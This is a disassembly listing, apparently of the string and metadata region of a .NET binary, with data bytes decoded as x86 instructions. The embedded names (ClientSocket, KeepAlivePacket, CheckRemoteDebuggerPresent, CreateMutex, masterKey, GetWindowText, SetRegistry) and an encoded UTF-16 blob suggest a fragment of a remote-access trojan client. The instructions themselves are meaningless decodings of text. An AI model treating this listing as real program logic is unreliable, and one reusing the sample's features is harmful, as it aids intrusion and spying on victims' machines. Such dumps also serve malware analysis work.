  40911d:	65 74 41             	gs je  0x409161
  409120:	73 46                	jae    0x409168
  409122:	6c                   	insb   (%dx),%es:(%edi)
  409123:	6f                   	outsl  %ds:(%esi),(%dx)
  409124:	61                   	popa
  409125:	74 00                	je     0x409127
  409127:	53                   	push   %ebx
  409128:	65 74 41             	gs je  0x40916c
  40912b:	73 46                	jae    0x409173
  40912d:	6c                   	insb   (%dx),%es:(%edi)
  40912e:	6f                   	outsl  %ds:(%esi),(%dx)
  40912f:	61                   	popa
  409130:	74 00                	je     0x409132
  409132:	46                   	inc    %esi
  409133:	69 6e 64 4f 62 6a 65 	imul   $0x656a624f,0x64(%esi),%ebp
  40913a:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  40913e:	61                   	popa
  40913f:	6e                   	outsb  %ds:(%esi),(%dx)
  409140:	61                   	popa
  409141:	67 65 6d             	gs insl (%dx),%es:(%di)
  409144:	65 6e                	outsb  %gs:(%esi),(%dx)
  409146:	74 42                	je     0x40918a
  409148:	61                   	popa
  409149:	73 65                	jae    0x4091b0
  40914b:	4f                   	dec    %edi
  40914c:	62 6a 65             	bound  %ebp,0x65(%edx)
  40914f:	63 74 00 46          	arpl   %esi,0x46(%eax,%eax,1)
  409153:	6f                   	outsl  %ds:(%esi),(%dx)
  409154:	72 63                	jb     0x4091b9
  409156:	65 50                	gs push %eax
  409158:	61                   	popa
  409159:	74 68                	je     0x4091c3
  40915b:	4f                   	dec    %edi
  40915c:	62 6a 65             	bound  %ebp,0x65(%edx)
  40915f:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  409163:	6f                   	outsl  %ds:(%esi),(%dx)
  409164:	6c                   	insb   (%dx),%es:(%edi)
  409165:	6c                   	insb   (%dx),%es:(%edi)
  409166:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  40916b:	6f                   	outsl  %ds:(%esi),(%dx)
  40916c:	6e                   	outsb  %ds:(%esi),(%dx)
  40916d:	6e                   	outsb  %ds:(%esi),(%dx)
  40916e:	65 63 74 00 52       	arpl   %esi,%gs:0x52(%eax,%eax,1)
  409173:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  409177:	6e                   	outsb  %ds:(%esi),(%dx)
  409178:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  40917d:	65 74 00             	gs je  0x409180
  409180:	53                   	push   %ebx
  409181:	79 73                	jns    0x4091f6
  409183:	74 65                	je     0x4091ea
  409185:	6d                   	insl   (%dx),%es:(%edi)
  409186:	2e 4e                	cs dec %esi
  409188:	65 74 00             	gs je  0x40918b
  40918b:	53                   	push   %ebx
  40918c:	65 74 00             	gs je  0x40918f
  40918f:	54                   	push   %esp
  409190:	61                   	popa
  409191:	72 67                	jb     0x4091fa
  409193:	65 74 00             	gs je  0x409196
  409196:	43                   	inc    %ebx
  409197:	6c                   	insb   (%dx),%es:(%edi)
  409198:	69 65 6e 74 2e 48 61 	imul   $0x61482e74,0x6e(%ebp),%esp
  40919f:	6e                   	outsb  %ds:(%esi),(%dx)
  4091a0:	64 6c                	fs insb (%dx),%es:(%edi)
  4091a2:	65 5f                	gs pop %edi
  4091a4:	50                   	push   %eax
  4091a5:	61                   	popa
  4091a6:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4091a9:	74 00                	je     0x4091ab
  4091ab:	4b                   	dec    %ebx
  4091ac:	65 65 70 41          	gs gs jo 0x4091f1
  4091b0:	6c                   	insb   (%dx),%es:(%edi)
  4091b1:	69 76 65 50 61 63 6b 	imul   $0x6b636150,0x65(%esi),%esi
  4091b8:	65 74 00             	gs je  0x4091bb
  4091bb:	43                   	inc    %ebx
  4091bc:	6c                   	insb   (%dx),%es:(%edi)
  4091bd:	69 65 6e 74 53 6f 63 	imul   $0x636f5374,0x6e(%ebp),%esp
  4091c4:	6b 65 74 00          	imul   $0x0,0x74(%ebp),%esp
  4091c8:	53                   	push   %ebx
  4091c9:	79 73                	jns    0x40923e
  4091cb:	74 65                	je     0x409232
  4091cd:	6d                   	insl   (%dx),%es:(%edi)
  4091ce:	2e 43                	cs inc %ebx
  4091d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4091d1:	6c                   	insb   (%dx),%es:(%edi)
  4091d2:	6c                   	insb   (%dx),%es:(%edi)
  4091d3:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4091d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4091d9:	73 2e                	jae    0x409209
  4091db:	49                   	dec    %ecx
  4091dc:	45                   	inc    %ebp
  4091dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4091de:	75 6d                	jne    0x40924d
  4091e0:	65 72 61             	gs jb  0x409244
  4091e3:	74 6f                	je     0x409254
  4091e5:	72 2e                	jb     0x409215
  4091e7:	52                   	push   %edx
  4091e8:	65 73 65             	gs jae 0x409250
  4091eb:	74 00                	je     0x4091ed
  4091ed:	67 65 74 5f          	addr16 gs je 0x409250
  4091f1:	4f                   	dec    %edi
  4091f2:	66 66 73 65          	data16 data16 jae 0x40925b
  4091f6:	74 00                	je     0x4091f8
  4091f8:	73 65                	jae    0x40925f
  4091fa:	74 5f                	je     0x40925b
  4091fc:	4f                   	dec    %edi
  4091fd:	66 66 73 65          	data16 data16 jae 0x409266
  409201:	74 00                	je     0x409203
  409203:	53                   	push   %ebx
  409204:	70 6c                	jo     0x409272
  409206:	69 74 00 43 6c 69 65 	imul   $0x6e65696c,0x43(%eax,%eax,1),%esi
  40920d:	6e 
  40920e:	74 4f                	je     0x40925f
  409210:	6e                   	outsb  %ds:(%esi),(%dx)
  409211:	45                   	inc    %ebp
  409212:	78 69                	js     0x40927d
  409214:	74 00                	je     0x409216
  409216:	53                   	push   %ebx
  409217:	61                   	popa
  409218:	6c                   	insb   (%dx),%es:(%edi)
  409219:	74 00                	je     0x40921b
  40921b:	49                   	dec    %ecx
  40921c:	41                   	inc    %ecx
  40921d:	73 79                	jae    0x409298
  40921f:	6e                   	outsb  %ds:(%esi),(%dx)
  409220:	63 52 65             	arpl   %edx,0x65(%edx)
  409223:	73 75                	jae    0x40929a
  409225:	6c                   	insb   (%dx),%es:(%edi)
  409226:	74 00                	je     0x409228
  409228:	54                   	push   %esp
  409229:	6f                   	outsl  %ds:(%esi),(%dx)
  40922a:	55                   	push   %ebp
  40922b:	70 70                	jo     0x40929d
  40922d:	65 72 49             	gs jb  0x409279
  409230:	6e                   	outsb  %ds:(%esi),(%dx)
  409231:	76 61                	jbe    0x409294
  409233:	72 69                	jb     0x40929e
  409235:	61                   	popa
  409236:	6e                   	outsb  %ds:(%esi),(%dx)
  409237:	74 00                	je     0x409239
  409239:	57                   	push   %edi
  40923a:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  40923e:	69 65 6e 74 00 49 6e 	imul   $0x6e490074,0x6e(%ebp),%esp
  409245:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  40924c:	65 
  40924d:	43                   	inc    %ebx
  40924e:	6c                   	insb   (%dx),%es:(%edi)
  40924f:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409256:	74 5f                	je     0x4092b7
  409258:	53                   	push   %ebx
  409259:	73 6c                	jae    0x4092c7
  40925b:	43                   	inc    %ebx
  40925c:	6c                   	insb   (%dx),%es:(%edi)
  40925d:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409264:	74 5f                	je     0x4092c5
  409266:	53                   	push   %ebx
  409267:	73 6c                	jae    0x4092d5
  409269:	43                   	inc    %ebx
  40926a:	6c                   	insb   (%dx),%es:(%edi)
  40926b:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409272:	74 5f                	je     0x4092d3
  409274:	54                   	push   %esp
  409275:	63 70 43             	arpl   %esi,0x43(%eax)
  409278:	6c                   	insb   (%dx),%es:(%edi)
  409279:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409280:	74 5f                	je     0x4092e1
  409282:	54                   	push   %esp
  409283:	63 70 43             	arpl   %esi,0x43(%eax)
  409286:	6c                   	insb   (%dx),%es:(%edi)
  409287:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  40928e:	74 68                	je     0x4092f8
  409290:	65 6e                	outsb  %gs:(%esi),(%dx)
  409292:	74 69                	je     0x4092fd
  409294:	63 61 74             	arpl   %esp,0x74(%ecx)
  409297:	65 41                	gs inc %ecx
  409299:	73 43                	jae    0x4092de
  40929b:	6c                   	insb   (%dx),%es:(%edi)
  40929c:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  4092a3:	73 74                	jae    0x409319
  4092a5:	65 6d                	gs insl (%dx),%es:(%edi)
  4092a7:	2e 4d                	cs dec %ebp
  4092a9:	61                   	popa
  4092aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ab:	61                   	popa
  4092ac:	67 65 6d             	gs insl (%dx),%es:(%di)
  4092af:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092b1:	74 00                	je     0x4092b3
  4092b3:	45                   	inc    %ebp
  4092b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4092b5:	76 69                	jbe    0x409320
  4092b7:	72 6f                	jb     0x409328
  4092b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ba:	6d                   	insl   (%dx),%es:(%edi)
  4092bb:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092bd:	74 00                	je     0x4092bf
  4092bf:	70 61                	jo     0x409322
  4092c1:	72 65                	jb     0x409328
  4092c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4092c4:	74 00                	je     0x4092c6
  4092c6:	53                   	push   %ebx
  4092c7:	79 73                	jns    0x40933c
  4092c9:	74 65                	je     0x409330
  4092cb:	6d                   	insl   (%dx),%es:(%edi)
  4092cc:	2e 43                	cs inc %ebx
  4092ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4092cf:	6c                   	insb   (%dx),%es:(%edi)
  4092d0:	6c                   	insb   (%dx),%es:(%edi)
  4092d1:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4092d7:	73 2e                	jae    0x409307
  4092d9:	49                   	dec    %ecx
  4092da:	45                   	inc    %ebp
  4092db:	6e                   	outsb  %ds:(%esi),(%dx)
  4092dc:	75 6d                	jne    0x40934b
  4092de:	65 72 61             	gs jb  0x409342
  4092e1:	74 6f                	je     0x409352
  4092e3:	72 2e                	jb     0x409313
  4092e5:	43                   	inc    %ebx
  4092e6:	75 72                	jne    0x40935a
  4092e8:	72 65                	jb     0x40934f
  4092ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4092eb:	74 00                	je     0x4092ed
  4092ed:	53                   	push   %ebx
  4092ee:	79 73                	jns    0x409363
  4092f0:	74 65                	je     0x409357
  4092f2:	6d                   	insl   (%dx),%es:(%edi)
  4092f3:	2e 43                	cs inc %ebx
  4092f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4092f6:	6c                   	insb   (%dx),%es:(%edi)
  4092f7:	6c                   	insb   (%dx),%es:(%edi)
  4092f8:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4092fe:	73 2e                	jae    0x40932e
  409300:	49                   	dec    %ecx
  409301:	45                   	inc    %ebp
  409302:	6e                   	outsb  %ds:(%esi),(%dx)
  409303:	75 6d                	jne    0x409372
  409305:	65 72 61             	gs jb  0x409369
  409308:	74 6f                	je     0x409379
  40930a:	72 2e                	jb     0x40933a
  40930c:	67 65 74 5f          	addr16 gs je 0x40936f
  409310:	43                   	inc    %ebx
  409311:	75 72                	jne    0x409385
  409313:	72 65                	jb     0x40937a
  409315:	6e                   	outsb  %ds:(%esi),(%dx)
  409316:	74 00                	je     0x409318
  409318:	47                   	inc    %edi
  409319:	65 74 43             	gs je  0x40935f
  40931c:	75 72                	jne    0x409390
  40931e:	72 65                	jb     0x409385
  409320:	6e                   	outsb  %ds:(%esi),(%dx)
  409321:	74 00                	je     0x409323
  409323:	43                   	inc    %ebx
  409324:	68 65 63 6b 52       	push   $0x526b6365
  409329:	65 6d                	gs insl (%dx),%es:(%edi)
  40932b:	6f                   	outsl  %ds:(%esi),(%dx)
  40932c:	74 65                	je     0x409393
  40932e:	44                   	inc    %esp
  40932f:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  409333:	67 65 72 50          	addr16 gs jb 0x409387
  409337:	72 65                	jb     0x40939e
  409339:	73 65                	jae    0x4093a0
  40933b:	6e                   	outsb  %ds:(%esi),(%dx)
  40933c:	74 00                	je     0x40933e
  40933e:	69 73 44 65 62 75 67 	imul   $0x67756265,0x44(%ebx),%esi
  409345:	67 65 72 50          	addr16 gs jb 0x409399
  409349:	72 65                	jb     0x4093b0
  40934b:	73 65                	jae    0x4093b2
  40934d:	6e                   	outsb  %ds:(%esi),(%dx)
  40934e:	74 00                	je     0x409350
  409350:	67 65 74 5f          	addr16 gs je 0x4093b3
  409354:	52                   	push   %edx
  409355:	65 6d                	gs insl (%dx),%es:(%edi)
  409357:	6f                   	outsl  %ds:(%esi),(%dx)
  409358:	74 65                	je     0x4093bf
  40935a:	45                   	inc    %ebp
  40935b:	6e                   	outsb  %ds:(%esi),(%dx)
  40935c:	64 50                	fs push %eax
  40935e:	6f                   	outsl  %ds:(%esi),(%dx)
  40935f:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  409366:	5f                   	pop    %edi
  409367:	43                   	inc    %ebx
  409368:	6f                   	outsl  %ds:(%esi),(%dx)
  409369:	75 6e                	jne    0x4093d9
  40936b:	74 00                	je     0x40936d
  40936d:	67 65 74 5f          	addr16 gs je 0x4093d0
  409371:	50                   	push   %eax
  409372:	72 6f                	jb     0x4093e3
  409374:	63 65 73             	arpl   %esp,0x73(%ebp)
  409377:	73 6f                	jae    0x4093e8
  409379:	72 43                	jb     0x4093be
  40937b:	6f                   	outsl  %ds:(%esi),(%dx)
  40937c:	75 6e                	jne    0x4093ec
  40937e:	74 00                	je     0x409380
  409380:	63 6f 75             	arpl   %ebp,0x75(%edi)
  409383:	6e                   	outsb  %ds:(%esi),(%dx)
  409384:	74 00                	je     0x409386
  409386:	47                   	inc    %edi
  409387:	65 74 50             	gs je  0x4093da
  40938a:	61                   	popa
  40938b:	74 68                	je     0x4093f5
  40938d:	52                   	push   %edx
  40938e:	6f                   	outsl  %ds:(%esi),(%dx)
  40938f:	6f                   	outsl  %ds:(%esi),(%dx)
  409390:	74 00                	je     0x409392
  409392:	44                   	inc    %esp
  409393:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  409397:	70 74                	jo     0x40940d
  409399:	00 45 6e             	add    %al,0x6e(%ebp)
  40939c:	63 72 79             	arpl   %esi,0x79(%edx)
  40939f:	70 74                	jo     0x409415
  4093a1:	00 50 61             	add    %dl,0x61(%eax)
  4093a4:	72 61                	jb     0x409407
  4093a6:	6d                   	insl   (%dx),%es:(%edi)
  4093a7:	65 74 65             	gs je  0x40940f
  4093aa:	72 69                	jb     0x409415
  4093ac:	7a 65                	jp     0x409413
  4093ae:	64 54                	fs push %esp
  4093b0:	68 72 65 61 64       	push   $0x64616572
  4093b5:	53                   	push   %ebx
  4093b6:	74 61                	je     0x409419
  4093b8:	72 74                	jb     0x40942e
  4093ba:	00 43 6f             	add    %al,0x6f(%ebx)
  4093bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4093be:	76 65                	jbe    0x409425
  4093c0:	72 74                	jb     0x409436
  4093c2:	00 46 61             	add    %al,0x61(%esi)
  4093c5:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  4093cc:	54 
  4093cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4093ce:	4c                   	dec    %esp
  4093cf:	69 73 74 00 69 6e 70 	imul   $0x706e6900,0x74(%ebx),%esi
  4093d6:	75 74                	jne    0x40944c
  4093d8:	00 53 79             	add    %dl,0x79(%ebx)
  4093db:	73 74                	jae    0x409451
  4093dd:	65 6d                	gs insl (%dx),%es:(%edi)
  4093df:	2e 43                	cs inc %ebx
  4093e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4093e2:	6c                   	insb   (%dx),%es:(%edi)
  4093e3:	6c                   	insb   (%dx),%es:(%edi)
  4093e4:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4093e9:	6e                   	outsb  %ds:(%esi),(%dx)
  4093ea:	73 2e                	jae    0x40941a
  4093ec:	49                   	dec    %ecx
  4093ed:	45                   	inc    %ebp
  4093ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4093ef:	75 6d                	jne    0x40945e
  4093f1:	65 72 61             	gs jb  0x409455
  4093f4:	74 6f                	je     0x409465
  4093f6:	72 2e                	jb     0x409426
  4093f8:	4d                   	dec    %ebp
  4093f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4093fa:	76 65                	jbe    0x409461
  4093fc:	4e                   	dec    %esi
  4093fd:	65 78 74             	gs js  0x409474
  409400:	00 53 79             	add    %dl,0x79(%ebx)
  409403:	73 74                	jae    0x409479
  409405:	65 6d                	gs insl (%dx),%es:(%edi)
  409407:	2e 54                	cs push %esp
  409409:	65 78 74             	gs js  0x409480
  40940c:	00 47 65             	add    %al,0x65(%edi)
  40940f:	74 57                	je     0x409468
  409411:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  409418:	78 74                	js     0x40948e
  40941a:	00 74 65 78          	add    %dh,0x78(%ebp,%eiz,2)
  40941e:	74 00                	je     0x409420
  409420:	76 00                	jbe    0x409422
  409422:	47                   	inc    %edi
  409423:	65 74 46             	gs je  0x40946c
  409426:	6f                   	outsl  %ds:(%esi),(%dx)
  409427:	72 65                	jb     0x40948e
  409429:	67 72 6f             	addr16 jb 0x40949b
  40942c:	75 6e                	jne    0x40949c
  40942e:	64 57                	fs push %edi
  409430:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  409437:	65 74 5f             	gs je  0x409499
  40943a:	43                   	inc    %ebx
  40943b:	72 65                	jb     0x4094a2
  40943d:	61                   	popa
  40943e:	74 65                	je     0x4094a5
  409440:	4e                   	dec    %esi
  409441:	6f                   	outsl  %ds:(%esi),(%dx)
  409442:	57                   	push   %edi
  409443:	69 6e 64 6f 77 00 69 	imul   $0x6900776f,0x64(%esi),%ebp
  40944a:	6e                   	outsb  %ds:(%esi),(%dx)
  40944b:	64 65 78 00          	fs gs js 0x40944f
  40944f:	43                   	inc    %ebx
  409450:	6c                   	insb   (%dx),%es:(%edi)
  409451:	6f                   	outsl  %ds:(%esi),(%dx)
  409452:	73 65                	jae    0x4094b9
  409454:	4d                   	dec    %ebp
  409455:	75 74                	jne    0x4094cb
  409457:	65 78 00             	gs js  0x40945a
  40945a:	43                   	inc    %ebx
  40945b:	72 65                	jb     0x4094c2
  40945d:	61                   	popa
  40945e:	74 65                	je     0x4094c5
  409460:	4d                   	dec    %ebp
  409461:	75 74                	jne    0x4094d7
  409463:	65 78 00             	gs js  0x409466
  409466:	44                   	inc    %esp
  409467:	65 6c                	gs insb (%dx),%es:(%edi)
  409469:	61                   	popa
  40946a:	79 00                	jns    0x40946c
  40946c:	57                   	push   %edi
  40946d:	69 72 74 65 41 72 72 	imul   $0x72724165,0x74(%edx),%esi
  409474:	61                   	popa
  409475:	79 00                	jns    0x409477
  409477:	49                   	dec    %ecx
  409478:	6e                   	outsb  %ds:(%esi),(%dx)
  409479:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409480:	65 
  409481:	41                   	inc    %ecx
  409482:	72 72                	jb     0x4094f6
  409484:	61                   	popa
  409485:	79 00                	jns    0x409487
  409487:	4d                   	dec    %ebp
  409488:	73 67                	jae    0x4094f1
  40948a:	50                   	push   %eax
  40948b:	61                   	popa
  40948c:	63 6b 41             	arpl   %ebp,0x41(%ebx)
  40948f:	72 72                	jb     0x409503
  409491:	61                   	popa
  409492:	79 00                	jns    0x409494
  409494:	54                   	push   %esp
  409495:	6f                   	outsl  %ds:(%esi),(%dx)
  409496:	41                   	inc    %ecx
  409497:	72 72                	jb     0x40950b
  409499:	61                   	popa
  40949a:	79 00                	jns    0x40949c
  40949c:	67 65 74 5f          	addr16 gs je 0x4094ff
  4094a0:	41                   	inc    %ecx
  4094a1:	73 41                	jae    0x4094e4
  4094a3:	72 72                	jb     0x409517
  4094a5:	61                   	popa
  4094a6:	79 00                	jns    0x4094a8
  4094a8:	72 65                	jb     0x40950f
  4094aa:	66 41                	inc    %cx
  4094ac:	73 41                	jae    0x4094ef
  4094ae:	72 72                	jb     0x409522
  4094b0:	61                   	popa
  4094b1:	79 00                	jns    0x4094b3
  4094b3:	67 65 74 5f          	addr16 gs je 0x409516
  4094b7:	4b                   	dec    %ebx
  4094b8:	65 79 00             	gs jns 0x4094bb
  4094bb:	73 65                	jae    0x409522
  4094bd:	74 5f                	je     0x40951e
  4094bf:	4b                   	dec    %ebx
  4094c0:	65 79 00             	gs jns 0x4094c3
  4094c3:	43                   	inc    %ebx
  4094c4:	72 65                	jb     0x40952b
  4094c6:	61                   	popa
  4094c7:	74 65                	je     0x40952e
  4094c9:	53                   	push   %ebx
  4094ca:	75 62                	jne    0x40952e
  4094cc:	4b                   	dec    %ebx
  4094cd:	65 79 00             	gs jns 0x4094d0
  4094d0:	44                   	inc    %esp
  4094d1:	65 6c                	gs insb (%dx),%es:(%edi)
  4094d3:	65 74 65             	gs je  0x40953b
  4094d6:	53                   	push   %ebx
  4094d7:	75 62                	jne    0x40953b
  4094d9:	4b                   	dec    %ebx
  4094da:	65 79 00             	gs jns 0x4094dd
  4094dd:	4f                   	dec    %edi
  4094de:	70 65                	jo     0x409545
  4094e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4094e1:	53                   	push   %ebx
  4094e2:	75 62                	jne    0x409546
  4094e4:	4b                   	dec    %ebx
  4094e5:	65 79 00             	gs jns 0x4094e8
  4094e8:	67 65 74 5f          	addr16 gs je 0x40954b
  4094ec:	50                   	push   %eax
  4094ed:	75 62                	jne    0x409551
  4094ef:	6c                   	insb   (%dx),%es:(%edi)
  4094f0:	69 63 4b 65 79 00 5f 	imul   $0x5f007965,0x4b(%ebx),%esp
  4094f7:	61                   	popa
  4094f8:	75 74                	jne    0x40956e
  4094fa:	68 4b 65 79 00       	push   $0x79654b
  4094ff:	6d                   	insl   (%dx),%es:(%edi)
  409500:	61                   	popa
  409501:	73 74                	jae    0x409577
  409503:	65 72 4b             	gs jb  0x409551
  409506:	65 79 00             	gs jns 0x409509
  409509:	52                   	push   %edx
  40950a:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409511:	4b 65 
  409513:	79 00                	jns    0x409515
  409515:	5f                   	pop    %edi
  409516:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  40951a:	53                   	push   %ebx
  40951b:	79 73                	jns    0x409590
  40951d:	74 65                	je     0x409584
  40951f:	6d                   	insl   (%dx),%es:(%edi)
  409520:	2e 53                	cs push %ebx
  409522:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409526:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  40952d:	70 
  40952e:	74 6f                	je     0x40959f
  409530:	67 72 61             	addr16 jb 0x409594
  409533:	70 68                	jo     0x40959d
  409535:	79 00                	jns    0x409537
  409537:	41                   	inc    %ecx
  409538:	73 73                	jae    0x4095ad
  40953a:	65 6d                	gs insl (%dx),%es:(%edi)
  40953c:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409540:	41                   	inc    %ecx
  409541:	64 64 72 65          	fs fs jb 0x4095aa
  409545:	73 73                	jae    0x4095ba
  409547:	46                   	inc    %esi
  409548:	61                   	popa
  409549:	6d                   	insl   (%dx),%es:(%edi)
  40954a:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  409551:	63 
  409552:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  409556:	79 00                	jns    0x409558
  409558:	57                   	push   %edi
  409559:	72 69                	jb     0x4095c4
  40955b:	74 65                	je     0x4095c2
  40955d:	42                   	inc    %edx
  40955e:	69 6e 61 72 79 00 54 	imul   $0x54007972,0x61(%esi),%ebp
  409565:	6f                   	outsl  %ds:(%esi),(%dx)
  409566:	42                   	inc    %edx
  409567:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  40956e:	65 74 5f             	gs je  0x4095d0
  409571:	53                   	push   %ebx
  409572:	79 73                	jns    0x4095e7
  409574:	74 65                	je     0x4095db
  409576:	6d                   	insl   (%dx),%es:(%edi)
  409577:	44                   	inc    %esp
  409578:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40957f:	79 00                	jns    0x409581
  409581:	53                   	push   %ebx
  409582:	65 74 52             	gs je  0x4095d7
  409585:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  40958c:	00 6f 
  40958e:	70 5f                	jo     0x4095ef
  409590:	45                   	inc    %ebp
  409591:	71 75                	jno    0x409608
  409593:	61                   	popa
  409594:	6c                   	insb   (%dx),%es:(%edi)
  409595:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  40959c:	49 
  40959d:	6e                   	outsb  %ds:(%esi),(%dx)
  40959e:	65 71 75             	gs jno 0x409616
  4095a1:	61                   	popa
  4095a2:	6c                   	insb   (%dx),%es:(%edi)
  4095a3:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  4095aa:	74 
  4095ab:	65 6d                	gs insl (%dx),%es:(%edi)
  4095ad:	2e 4e                	cs dec %esi
  4095af:	65 74 2e             	gs je  0x4095e0
  4095b2:	53                   	push   %ebx
  4095b3:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4095b7:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  4095be:	64 
  4095bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4095c0:	77 73                	ja     0x409635
  4095c2:	49                   	dec    %ecx
  4095c3:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4095c6:	74 69                	je     0x409631
  4095c8:	74 79                	je     0x409643
  4095ca:	00 49 73             	add    %cl,0x73(%ecx)
  4095cd:	4e                   	dec    %esi
  4095ce:	75 6c                	jne    0x40963c
  4095d0:	6c                   	insb   (%dx),%es:(%edi)
  4095d1:	4f                   	dec    %edi
  4095d2:	72 45                	jb     0x409619
  4095d4:	6d                   	insl   (%dx),%es:(%edi)
  4095d5:	70 74                	jo     0x40964b
  4095d7:	79 00                	jns    0x4095d9
  4095d9:	00 00                	add    %al,(%eax)
  4095db:	00 00                	add    %al,(%eax)
  4095dd:	0d 53 00 48 00       	or     $0x480053,%eax
  4095e2:	41                   	inc    %ecx
  4095e3:	00 32                	add    %dh,(%edx)
  4095e5:	00 35 00 36 00 00    	add    %dh,0x3600
  4095eb:	80 b1 6c 00 76 00 52 	xorb   $0x52,0x76006c(%ecx)
  4095f2:	00 78 00             	add    %bh,0x0(%eax)
  4095f5:	41                   	inc    %ecx
  4095f6:	00 39                	add    %bh,(%ecx)
  4095f8:	00 69 00             	add    %ch,0x0(%ecx)
  4095fb:	63 00                	arpl   %eax,(%eax)
  4095fd:	50                   	push   %eax
  4095fe:	00 41 00             	add    %al,0x0(%ecx)
  409601:	36 00 6b 00          	add    %ch,%ss:0x0(%ebx)
  409605:	71 00                	jno    0x409607
  409607:	6b 00 66             	imul   $0x66,(%eax),%eax
  40960a:	00 5a 00             	add    %bl,0x0(%edx)
  40960d:	6f                   	outsl  %ds:(%esi),(%dx)
  40960e:	00 31                	add    %dh,(%ecx)
  409610:	00 6c 00 50          	add    %ch,0x50(%eax,%eax,1)
  409614:	00 34 00             	add    %dh,(%eax,%eax,1)
  409617:	54                   	push   %esp
  409618:	00 57 00             	add    %dl,0x0(%edi)
  40961b:	75 00                	jne    0x40961d
  40961d:	43                   	inc    %ebx
  40961e:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
  409622:	00 67 00             	add    %ah,0x0(%edi)
  409625:	6f                   	outsl  %ds:(%esi),(%dx)
  409626:	00 54 00 75          	add    %dl,0x75(%eax,%eax,1)
  40962a:	00 6c 00 35          	add    %ch,0x35(%eax,%eax,1)
  40962e:	00 33                	add    %dh,(%ebx)
  409630:	00 4c 00 50          	add    %cl,0x50(%eax,%eax,1)
  409634:	00 37                	add    %dh,(%edi)
  409636:	00 6d 00             	add    %ch,0x0(%ebp)
  409639:	4b                   	dec    %ebx
  40963a:	00 57 00             	add    %dl,0x0(%edi)
  40963d:	6c                   	insb   (%dx),%es:(%edi)
  40963e:	00 37                	add    %dh,(%edi)
  409640:	00 33                	add    %dh,(%ebx)
  409642:	00 54 00 53          	add    %dl,0x53(%eax,%eax,1)
  409646:	00 77 00             	add    %dh,0x0(%edi)
  409649:	30 00                	xor    %al,(%eax)
  40964b:	59                   	pop    %ecx
  40964c:	00 52 00             	add    %dl,0x0(%edx)
  40964f:	31 00                	xor    %eax,(%eax)
  409651:	6c                   	insb   (%dx),%es:(%edi)
  409652:	00 52 00             	add    %dl,0x0(%edx)
  409655:	46                   	inc    %esi
